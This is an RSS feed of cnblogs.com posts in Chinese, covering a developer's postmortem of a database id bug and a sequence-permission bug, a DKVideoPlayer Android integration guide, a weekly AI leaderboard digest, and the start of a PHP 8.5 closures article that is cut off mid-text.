{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "最近遇到的两个技术问题记录",
      "link": "https://www.cnblogs.com/grey-wolf/p/19495709",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/grey-wolf/p/19495709\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:23\">\n    <span>最近遇到的两个技术问题记录</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"问题1\">问题1</h1>\n<h2 id=\"背景\">背景</h2>\n<p>有个供内部员工使用的后台管理系统，每天会从上游的一个oa系统的接口同步员工数据，oa系统侧维护了每个员工的id、名称、工作城市等等各类信息，接口响应如下：</p>\n<p><img alt=\"image-20260117104211631\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104211631.png\" /></p>\n<p>这个id就算是员工的唯一标识，就像工号一样，不会变的那种。因此，我们把接口数据拿到后，就直接落地到我们本地数据库的表中，表的主键虽然设定为自增主键，但是在程序里，我们会直接用oa系统给我们的这个id来设置本地表id的值后再插入。</p>\n<p><img alt=\"image-20260117105119562\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105119562.png\" /></p>\n<p>表结构：</p>\n<p><img alt=\"image-20260117122224831\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122224831.png\" /></p>\n<p>sql如下：这个sql是自动生成的，默认生成出来的是不带id这种主键字段的，我们手动加了一下：</p>\n<p><img alt=\"image-20260117105019010\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105019010.png\" /></p>\n<p>手动加上id字段：</p>\n<p><img alt=\"image-20260117104906664\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104906664.png\" /></p>\n<p>结果，最近弄了一个员工报商业保险的活动，简单来说，就是存储一下数据：用户id 、对应的商业保险id。</p>\n<p>报保险的过程中，发现用户表缺了些数据没同步，如用户证件号（报保险需要）、城市等，所以就加了一下这几个字段。</p>\n<p><img alt=\"image-20260117105522469\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105522469.png\" /></p>\n<p>新增完字段后，mapper.xml代码自动生成，也没仔细看，结果就把之前手动加的id字段给冲掉了：</p>\n<p><img alt=\"image-20260117105645320\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105645320.png\" /></p>\n<p>这个上线后，由于在程序中没有指定id字段，就导致本地表中的id变成了使用自增的方式（postgresql，从序列中获取下一个id的值，类似mysql中自增）。</p>\n<p>而且，从oa系统同步员工信息到我方系统，每天都是靠一个定时任务在跑，每天跑的时候：</p>\n<pre><code class=\"language-shell\">1、从oa侧获取员工列表数据\n2、清空本地表\n3、批量插入从oa侧获取的员工数据\n</code></pre>\n<p>这就导致，员工的id，上线后，每天都在变，每天都在变。</p>\n<p>当时我查问题看到这个问题的时候，吓了一跳，当时员工报商业保险正如火如荼呢，我一想：难道得赶紧通知全公司的人，重新报了？而且，当时业务的人和保险公司约定的提供保险人员名单的时间也没几天了。。。</p>\n<p>后面我又仔细看了下，发现问题还没有那么大。</p>\n<p>就是在数据先落地到t_user_sync这个表（这个表和上游oa侧数据保持一模一样，只读不写，便于定位问题）后，还有个定时任务，将数据从t_user_sync转移到我们实际的用户表（sy_user），这个表我们会进行增删改查等等。</p>\n<p><img alt=\"image-20260117110408095\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117110408095.png\" /></p>\n<p>这个定时任务，在将t_user_sync转移到sy_user的过程中，是增量同步的。如，发现zhangsan这个用户时，先查一下sy_user里有没有，没有才插入，插入时，sy_user的id也是用的t_user_sync的id（也就是oa侧的id），有就更新。</p>\n<p>这个增量同步机制，救了我，导致的结果是，虽然t_user_sync中id错了，且每天都在变；但sy_user中的id虽然也是错的，但是不会每天变，而是用到第一次同步t_user_sync时的id。</p>\n<p>只要sy_user表中的id不变，错的也影响不大，至少员工报保险的相关表中的关联关系是没问题的：</p>\n<p>员工id          员工名称    保险名称</p>\n<p>11111(错的)  张三         xxx商业保险</p>\n<p>而我们这个系统中，其他地方也有用到这个用户id的，虽然由于用户id变化导致了关联关系错乱，但是影响毕竟业务影响没那么大，到时候再修复即可。</p>\n<h2 id=\"总结\">总结</h2>\n<p>其实，这个问题就是粗心造成的，当然，客观上，现在手里系统太多，精力分散也是一个原因。</p>\n<p>另外，这个自动生成代码的机制，后期看看这块是否可以优化吧，能把id字段一起生成到xml中是最好。</p>\n<p>如果实在不行的话，也应该考虑，这种表的id字段，就设置为非自增、非空，必须让程序手动设置，也能及时发现问题。</p>\n<h2 id=\"问题2\">问题2</h2>\n<h2 id=\"etl\">etl</h2>\n<p>介绍背景前，先讲讲etl吧：</p>\n<p>在我从业没几年的时候，当时由于接触的都是mysql这种oltp这类业务为主，有时候看到一些招聘岗位写etl，不知道是啥意思。也是这几年才大概了解：</p>\n<pre><code class=\"language-shell\">将企业中分散的数据，集中的输入到数据仓库中的过程，就是 ETL。\n\nExtract（提取）： 从多个异构数据源（如数据库、文件系统、API等）中提取原始数据。数据源可以是关系型数据库（如MySQL、PostgreSQL）、非关系型数据库（如MongoDB、Cassandra）、文件（如CSV、JSON）、API或流式数据源。\n\nTransform（转换）： 对提取的数据进行清洗、标准化、聚合、去重等操作，以满足业务需求或数据分析的要求。这一步可能涉及数据类型转换、格式转换、业务规则应用、数据聚合、数据质量校验等。\n\nLoad（加载）： 将转换后的数据加载到目标存储系统中，通常是数据仓库或数据湖中，供后续的数据分析、报表或机器学习等用途。加载的方式可以是全量加载、增量加载或实时加载。\n</code></pre>\n<p><img alt=\"image-20260117113327615\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117113327615.png\" /></p>\n<p>像我们公司，数据库种类又多（oracle、mysql、pg、国产），系统又多，好多系统还是买的，你想要某个系统的数据，要么走接口，要么通过人家的表。一方面，好多买的系统，不喜欢对外提供接口（商业上的考虑，毕竟数据是无价的，让你难以迁移，也就是这几年，感觉新的软件系统才开始注重对外提供api）；另一方面，有时候表很多，有些表也很大，自己写接口去每天同步，工作量也不小，还要申请api key/api secret，还要开通网络，也是挺麻烦的，最终就慢慢习惯了、妥协了，通过数仓etl同步，还是能省一些事吧。</p>\n<h2 id=\"背景-1\">背景</h2>\n<p>另一个c端系统，重要性比上面那个系统重要多了，这两天也出了一个问题。</p>\n<p>这个系统，本来是一个外包同事在维护，由于他所在的公司和我们公司不再合作了，他也就跟着离职了（其实可以和新外包公司签约，不过他说新外包公司不太喜欢）。他开发完成了最后一个功能并完成测试后，还没来得及系统上线，所以上线的事就我来弄。</p>\n<p>我整理了一下上线的各种变更，如sql、nacos配置、xxljob、版本jar包、前端包等等一大堆，写了个文档就提交变更流程了。</p>\n<p>其中一个sql，是给某个数仓同步表加id字段（并新建了序列，设置id字段通过序列来自增），我当时还专门研究了一下：</p>\n<p>我们有两个表，jy_sync_h_logasset （当前表）、jy_sync_h_logasset_history（历史表），两个表的结构类似，只是一个存储最近几个月的数据（jy_sync_h_logasset ），一个存储几个人前的数据（jy_sync_h_logasset_history）。系统会定期把几个月前的数据，从当前表，转移到历史表里去，保证当前表的数据量不要太大，影响查询速度。</p>\n<p>这两个表，有一个问题，就是表没有设置id这种主键，为啥没主键呢，因为jy_sync_h_logasset 这个表的数据，是通过数仓的etl操作，从其他上游数据库搬运过来的。</p>\n<p>jy_sync_h_logasset 对应的上游的话，不一定是一个表，可能是一个视图，或者是一个sql，比如select name,oa_account from employee这种，它的sql中，就没有查询id字段，或者是多表join那种（一对多），就是算有id，也会导致id重复。</p>\n<p>所以，我猜测是这个原因，导致我方的这个表，是没有id字段的，也没弄主键。</p>\n<p>一个表，没有主键，据我所知，在分页查询时，容易不稳定，某一条记录可能会在这一页出现，在下一页继续出现，一般我们解决这种分页查询不稳定的问题，都是会按照某个字段排序，而一般首选就是id字段。</p>\n<p>对于这个没有id字段的表来说，分页查询应该是容易出问题的，所以我猜测，这就是本次sql变更（加id字段，创建序列，设置id字段从序列取值）的原因。</p>\n<p><img alt=\"image-20260117115053690\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117115053690.png\" /></p>\n<p>我当时为啥注意这个sql呢，我发现他只建了一个序列，然后两个表都用了这个序列，我当时多看了两眼，只是有点奇怪，一般来说，每个表会设置一个自己的序列。后来我看到，在将jy_sync_h_logasset表中几个月前的数据转移到jy_sync_h_logasset_history的定时任务中，代码里设置了jy_sync_h_logasset_history的id就直接使用jy_sync_h_logasset中的id，也就是说，jy_sync_h_logasset_history实际并不会使用序列中的值作为id，我也就没管了。当然，出事的确实也不是这个问题。</p>\n<p>周四下午，和运维一块，看着他做完上线变更，想着又了了一个事。结果周五早上，8点多，就给我发消息，说有个xxljob的定时任务失败了。</p>\n<p>我赶紧吃完饭，抱着电脑去找他，看了下，发现报错的原因是：</p>\n<p>一个etl_status的表中，没有查到当天的记录，这个表的用途是：数仓在给我们推送完各个表的数据后，会在etl_status中写入一条成功记录。</p>\n<p>既然这次报错是没查到数仓写的成功记录，是不是数据推送失败了呢，我们赶紧联系了数仓的同事，数仓同事过了会告诉我们说，是数仓在往jy_sync_h_logasset写记录时，报错了，提示对jy_sync_h_logasset_pk这个序列的权限不足。然后我过去找他，仔细聊了下，比如，他那边的一次数仓etl任务，总共要推10个表过来，如果其中一个表失败了，就会导致：不写入etl_status成功记录。但已经推送成功的表（如这里成功了9个表）的数据并不会回退。</p>\n<p>问题是搞清楚了，还是粗心导致的，我当时完全没有想起来序列要给数仓用户授权这个事。</p>\n<p>但这个问题看起来小，导致的影响还是比较大的，由于我们定位这个问题及修复（给数仓用户增加权限，数仓重新推送）花了一些时间，修复时已经过了某个特定的时点了，导致我方已经没有时间再来跑xxljob了（某个xxljob任务由于下游系统的限制，要求必须在某个时点之前跑才行），只能是让业务同事去通知客户道歉。</p>\n<p>部门的领导也介入了这个事情，下周就得系统梳理下现状，再看看有没有在这种异常情况下进行补救的措施，当然，我们这边其实是可以补救的（数仓重新推送数据后，我方也重新执行xxljob相关任务），但是我们系统还有下游（现在就是下游系统不支持过了某个时间点后进行补救），这块还得再看看怎么弄。</p>\n<h2 id=\"总结-1\">总结</h2>\n<p>小小的问题，大大的影响，出了问题再来处理，一般成本是最高的，也会带来更多的工作，如事故汇报、针对事故的改进措施等。还是得防患于未然，治未病。</p>\n<p>当然，我简单看了下，希望postgresql可以做到：新增的序列，不用每次单独授权，而是在数据库级别进行授权。</p>\n<p><img alt=\"image-20260117122000029\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122000029.png\" /></p>\n<p>下周再研究下吧，和dba沟通下，避免现在权限管的太细导致的问题。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/grey-wolf\">三国梦回</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FFmpeg开发笔记（九十九）基于Kotlin的国产开源播放器DKVideoPlayer",
      "link": "https://www.cnblogs.com/aqi00/p/19379646",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/aqi00/p/19379646\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:15\">\n    <span>FFmpeg开发笔记（九十九）基于Kotlin的国产开源播放器DKVideoPlayer</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<span id=\"cke_bm_197S\">在Android平台上，基于FFmpeg的国产播放器开源框架也有很多了，前有哔哩哔哩的ijkplayer，后有小红书的RedPlayer，参见之前的文章《使用国产的ijkplayer播放器观看网络视频》和《使用国产的RedPlayer播放器观看网络视频》。</span>\n<p><span id=\"cke_bm_197S\"> 除此以外，DKVideoPlayer也是一款优秀的国产Android视频播放器，它基于Kotlin编写，不但集成了Android原生的MediaPlayer，还集成了Jetpack的ExoPlayer，甚至集成了国产的ijkplayer。DKVideoPlayer既支持播放本地视频，也支持播放网络视频，甚至支持播放直播链接，可谓功能强大。<br />\nDKVideoPlayer的源码托管地址为https://github.com/Doikki/DKVideoPlayer（星星数5.3k），国内的镜像地址为https://gitcode.com/gh_mirrors/dk/DKVideoPlayer，最新版本是2022年7月发布的v3.3.7，可见该框架的源码更新十分及时，该版本的源码下载地址为https://github.com/Doikki/DKVideoPlayer/archive/refs/tags/3.3.7.tar.gz。<br />\nDKVideoPlayer提供了两种集成方式，引用在线库、直接导入源码，分别说明如下：</span></p>\n<h1>一、引用DKVideoPlayer在线库</h1>\n<p>Android工程引用DKVideoPlayer在线库时，需要修改以下两个配置：<br />\n1、打开模块级别的build.gradle，给dependencies节点补充下面几行配置，表示引入3.3.7版本的DKVideoPlayer库：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\"># 必选，内部默认使用系统mediaplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:dkplayer-java:3.3.7'\n# 可选，包含StandardVideoController的实现\nimplementation 'xyz.doikki.android.dkplayer:dkplayer-ui:3.3.7'\n# 可选，使用exoplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:player-exo:3.3.7'\n# 可选，使用ijkplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:player-ijk:3.3.7'\n# 可选，如需要缓存或者抖音预加载功能请引入此库\nimplementation 'xyz.doikki.android.dkplayer:videocache:3.3.7'</code></pre>\n</div>\n<p>2、打开App模块的src/main/AndroidManifest.xml，给manifest节点补充下面几行权限配置，表示声明悬浮窗、存储空间和网络等权限：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\">&lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" /&gt;\n&lt;uses-permission android:name=\"android.permission.SYSTEM_OVERLAY_WINDOW\" /&gt;\n&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n&lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt;</code></pre>\n</div>\n<h1>二、直接导入DKVideoPlayer源码</h1>\n<p>DKVideoPlayer的源码已经适配Android Studio Dolphin（小海豚版本），仅需在项目级别的build.gradle补充国内仓库即可。也就是在repositories节点内部补充以下配置：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\">// 以下四行添加阿里云的仓库地址，方便国内开发者下载相关插件\nmaven { url = uri(\"https://maven.aliyun.com/repository/jcenter\") }\nmaven { url = uri(\"https://maven.aliyun.com/repository/google\")}\nmaven { url = uri(\"https://maven.aliyun.com/repository/gradle-plugin\")}\nmaven { url = uri(\"https://maven.aliyun.com/repository/public\")}\n// 以下添加清华大学的仓库地址\nmaven { url = uri(\"https://mirrors.tuna.tsinghua.edu.cn/repository/maven-central/\") }</code></pre>\n</div>\n<p>增加以上配置的目的是引入国内的仓库地址，以便加快相关依赖包的下载速度。</p>\n<p>等待DKVideoPlayer工程编译通过，把主入口的dkplayer-sample模块安装到手机上，启动之后的App界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer1\" class=\"lazyload\" height=\"468\" width=\"410\" /></span></span></span></span></p>\n<p>点击【点播】按钮，打开网络视频的播放界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer2\" class=\"lazyload\" height=\"609\" width=\"403\" /></span></span></span></span></p>\n<p>或者点击【直播】按钮，打开直播链接的播放界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer3\" class=\"lazyload\" height=\"608\" width=\"403\" /></span></span></span></span></p>\n<p>可见DKVideoPlayer支持调整播放窗口大小、调整播放速度，以及旋转、截图、裁剪等功能，可谓将常见的播放操作一网打尽。</p>\n<p>更多详细的FFmpeg开发知识参见<span class=\"cke_widget_wrapper cke_widget_inline cke_widget_csdnlink cke_widget_selected\"><a class=\"cke_widget_editable cke_widget_element\" href=\"https://item.jd.com/14020415.html\" rel=\"noopener nofollow\" title=\"《FFmpeg开发实战：从零基础到短视频上线》\">《FFmpeg开发实战：从零基础到短视频上线》</a>一书。</span></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:15</span>&nbsp;\n<a href=\"https://www.cnblogs.com/aqi00\">aqi00</a>&nbsp;\n阅读(<span id=\"post_view_count\">2</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大模型榜单周报（2026/1/17）",
      "link": "https://www.cnblogs.com/xjk15082/p/19495655",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xjk15082/p/19495655\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:01\">\n    <span>大模型榜单周报（2026/1/17）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"1-本周概览\">1. 本周概览</h3>\n<p>本周大模型领域继续保持快速发展态势，各大厂商在医疗AI、视频生成、代码能力等多个领域取得显著进展。OpenRouter模型调用量排名发生重要变化，Claude系列模型表现抢眼，百度新模型ERNIE-5.0-0110在全球LMArena文本排行榜上排名第八，展现了中国模型的强劲实力。</p>\n<h3 id=\"2-重点关注事件\">2. 重点关注事件</h3>\n<ul>\n<li>DeepSeek与北京大学合作发表关于条件记忆（conditional memory）的新论文，提出Engram模块，有望提升模型检索效率</li>\n<li>Anthropic推出工作场景智能体Claude Cowork，由Claude Code自主开发，体现了AGI在实际应用中的潜力</li>\n<li>谷歌发布新一代开源医疗AI模型MedGemma 1.5及MedASR语音识别模型，进一步扩展在医疗AI领域的布局</li>\n<li>谷歌Veo 3.1更新支持9:16竖屏视频和4K分辨率，视频生成能力持续提升</li>\n<li>智谱与华为合作开源图像生成模型GLM-Image，登顶复杂视觉文字生成和长文本渲染双榜首</li>\n<li>阿里千问APP上线超400项AI办事功能，接入阿里生态，成为全球首个能完成真实生活复杂任务的AI助手</li>\n<li>OpenAI推出独立翻译页面ChatGPT Translate，拓展应用场景</li>\n<li>百度ERNIE-5.0-0110在全球LMArena文本排行榜上排名第八，超越多个领先模型</li>\n</ul>\n<h3 id=\"3-榜单变化\">3. 榜单变化</h3>\n<ul>\n<li>\n<p><strong>OpenRouter模型调用量排名</strong>：</p>\n<ul>\n<li>整体调用量方面，Claude Opus 4.5超越上周榜首Claude Sonnet 4.5，位列第1；MiMo-V2-Flash(free)上升两名，排名第3；Gemini 3 Flash Preview由第4名下降至第5名</li>\n<li>模型市占率方面，Google保持第1；Anthropic市占率上升4.2%（17.2% → 21.5%），连续两周上升8.5%；OpenAI市占率上升3.1%（8.0% → 11.1%）；Qwen上升至第8名，替代了上周MiniMax的位置</li>\n<li>编程调用量方面，Claude Opus 4.5保持第1；Claude Sonnet 4.5排名上升2名，排名第3；DeepSeek V3.2重回前十，排名第8</li>\n</ul>\n</li>\n<li>\n<p><strong>大语言模型榜单</strong>：ERNIE-5.0-0110新上榜，排名第8，超过GPT-5.1（high），相比ERNIE-5.0-preview-1203版本上升了6名，该模型基于预发布测试，评分可能随着公开发布后的反馈而变化</p>\n</li>\n<li>\n<p><strong>图像编辑能力榜单</strong>：flux-2-max和flux-2-pro新上榜，分别排名第8、第9</p>\n</li>\n<li>\n<p><strong>文生图能力榜单</strong>：FLUX.2 [dev]Turbo新上榜，排名第10</p>\n</li>\n<li>\n<p><strong>GAIA榜单</strong>：JoinAI V2.2登顶榜首，得分达90.7%</p>\n</li>\n</ul>\n<h3 id=\"4-排行榜\">4. 排行榜</h3>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>第一名</th>\n<th>第二名</th>\n<th>第三名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>模型调用量</td>\n<td>Claude Opus 4.5</td>\n<td>Claude Sonnet 4.5</td>\n<td>MiMo-V2-Flash(free)</td>\n</tr>\n<tr>\n<td>公司市占率</td>\n<td>Google</td>\n<td>Anthropic</td>\n<td>OpenAI</td>\n</tr>\n<tr>\n<td>编程模型调用量</td>\n<td>Claude Opus 4.5</td>\n<td>Grok Code Fast 1</td>\n<td>Claude Sonnet 4.5</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"各公司按不同能力领域排名汇总\">各公司按不同能力领域排名汇总</h4>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>领先公司</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大语言模型 Text Arena</td>\n<td>Google、xAI、Anthropic、百度、OpenAI、智谱、阿里巴巴、月之暗面</td>\n</tr>\n<tr>\n<td>编程能力 LMArena</td>\n<td>Anthropic、OpenAI、Google、智谱、MiniMax</td>\n</tr>\n<tr>\n<td>编程能力 LiveCodeBench</td>\n<td>OpenAI、Anthropic、Google</td>\n</tr>\n<tr>\n<td>代码工程任务能力 SWE-benchLite</td>\n<td>基于Claude、Gemini、GPT、Qwen、DeepSeek开发的开源系统</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Edit Arena</td>\n<td>OpenAI、Google、字节、Black Forest Labs、Reve</td>\n</tr>\n<tr>\n<td>文生图能力 Text-to-Image Arena</td>\n<td>OpenAI、Google、Black Forest Labs、腾讯、字节</td>\n</tr>\n<tr>\n<td>文生图能力 Text to Image Leaderboard</td>\n<td>OpenAI、Google、Black Forest Labs、字节、ImagineArt</td>\n</tr>\n<tr>\n<td>GPQA</td>\n<td>OpenAI、Google、xAI、Anthropic、阿里巴巴</td>\n</tr>\n<tr>\n<td>FrontierMath</td>\n<td>OpenAI、Google、DeepSeek、月之暗面、Anthropic、xAI</td>\n</tr>\n<tr>\n<td>Humanity's Last Exam</td>\n<td>Google、OpenAI、Anthropic</td>\n</tr>\n<tr>\n<td>GAIA</td>\n<td>JoinAI、Nvidia、Suzhou AI Lab&amp;Shuqian Tech、Microsoft AI Asia -Ads</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>关注我，第一时间掌握更多AI前沿资讯！</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:01</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xjk15082\">KAI智习</a>&nbsp;\n阅读(<span id=\"post_view_count\">7</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PHP 8.5 闭包和一等可调用对象进入常量表达式",
      "link": "https://www.cnblogs.com/catchadmin/p/19494966",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19494966\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 08:09\">\n    <span>PHP 8.5 闭包和一等可调用对象进入常量表达式</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"php-85-闭包和一等可调用对象进入常量表达式\">PHP 8.5 闭包和一等可调用对象进入常量表达式</h1>\n<h2 id=\"当配置变成运行时胶水代码\">当\"配置\"变成运行时胶水代码</h2>\n<p>PHP 配置一直有个矛盾：</p>\n<ul>\n<li>你想要声明式配置：简单的数组、常量值、属性。</li>\n<li>但你也需要一点逻辑：\"验证这个字段\"、\"选择这个处理器\"、\"格式化这个值\"、\"过滤这个列表\"。</li>\n</ul>\n<p>以前，一旦你需要在\"配置类\"的地方加逻辑，就会碰壁。PHP 故意把很多结构限制在常量表达式——基本上就是不可变的值。属性参数是最明显的例子：你可以放整数、字符串、标量数组……但不能放闭包。</p>\n<p>所以我们用各种变通方案：</p>\n<ul>\n<li>存字符串如 <code>\"App\\\\Handler::handle\"</code>，然后用 <code>call_user_func</code> 调用。</li>\n<li>在属性里用\"迷你语言\"，比如表达式字符串。</li>\n<li>用可空回调，在运行时设置默认值。</li>\n<li>在引导文件里建注册表，而不是直接在该放的地方表达。</li>\n</ul>\n<p>PHP 8.5 改变了这个局面：静态闭包和一等可调用对象现在可以出现在常量表达式中，包括：</p>\n<ul>\n<li>属性参数</li>\n<li>属性和参数的默认值</li>\n<li>常量和类常量</li>\n</ul>\n<p>这听起来像编译器特性。实际上是个\"生活质量\"升级：让你把配置放在它配置的代码旁边，不用魔术字符串或运行时初始化 hack。</p>\n<p>这篇文章会讲\"为什么\"、具体规则（有重要限制），然后深入实际模式：路由映射、处理器注册表、策略/格式化器注册表。也会讲哪些场景不适合——因为如果不小心，可调用配置确实能搞出一团乱。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/php85-closures-callables-constant-expressions\" rel=\"noopener nofollow\" target=\"_blank\">原文 PHP 8.5 闭包和一等可调用对象进入常量表达式</a></p>\n<h2 id=\"旧痛点常量太受限逻辑只能塞进运行时初始化\">旧痛点：常量太受限，逻辑只能塞进运行时初始化</h2>\n<p>PHP 8.5 之前，限制不是你不能创建闭包——而是你不能在某些\"配置槽\"里用它们。</p>\n<p>三个常见痛点：</p>\n<h3 id=\"痛点-a回调默认值参数强制运行时初始化\">痛点 A：\"回调默认值\"参数强制运行时初始化</h3>\n<p>如果你想写一个接受可选回调的函数，并且想要一个合理的默认回调，通常这样做：</p>\n<pre><code class=\"language-php\">function my_filter(array $items, ?Closure $predicate = null): array\n{\n    $predicate ??= static function ($v): bool { return !empty($v); };\n    $out = [];\n    foreach ($items as $item) {\n        if ($predicate($item)) {\n            $out[] = $item;\n        }\n    }\n    return $out;\n}\n</code></pre>\n<p>这能用……但是样板代码，而且不是\"声明式\"的。</p>\n<p>PHP 8.5 的 RFC 明确提到这个用例：允许直接声明默认回调闭包，不用可空参数的变通方案。</p>\n<h3 id=\"痛点-b属性参数不能包含真正的逻辑\">痛点 B：属性参数不能包含真正的逻辑</h3>\n<p>属性是表达规则的自然场所：</p>\n<ul>\n<li>授权检查</li>\n<li>验证</li>\n<li>序列化行为</li>\n<li>测试用例生成</li>\n</ul>\n<p>但属性参数只能是常量表达式，所以人们用字符串或表达式对象。</p>\n<p>PHP 8.5 发布公告展示了一个典型的\"之前\"模式，访问控制属性接受字符串表达式。在 PHP 8.5 中你可以直接传静态闭包。</p>\n<h3 id=\"痛点-c注册表和路由映射变成运行时引导\">痛点 C：注册表和路由映射变成运行时引导</h3>\n<p>任何时候你想要从\"键\"到\"处理器\"的映射，你可能在运行时构建它：</p>\n<pre><code class=\"language-php\">$handlers = [\n    'json' =&gt; [JsonFormatter::class, 'format'],\n    'text' =&gt; [TextFormatter::class, 'format'],\n];\n</code></pre>\n<p>这能用，但很脆弱：</p>\n<ul>\n<li>IDE 重命名重构不能可靠地跟踪字符串方法名。</li>\n<li>静态分析更难理解什么是可调用的。</li>\n<li>你需要运行时代码来组装概念上是静态配置的东西。</li>\n</ul>\n<p>PHP 8.5 的常量表达式改进让你可以把这些注册表表达为常量——并且让处理器重构安全。</p>\n<h2 id=\"什么是常量表达式为什么重要\">什么是常量表达式，为什么重要</h2>\n<p>\"常量表达式\"是 PHP 内部术语，指在必须不依赖运行时状态就能计算的上下文中允许的表达式——可以理解为\"不可变值\"。</p>\n<p>这些上下文包括：</p>\n<ul>\n<li>属性参数</li>\n<li>参数和属性的默认值</li>\n<li>（类）常量</li>\n</ul>\n<p>闭包 RFC 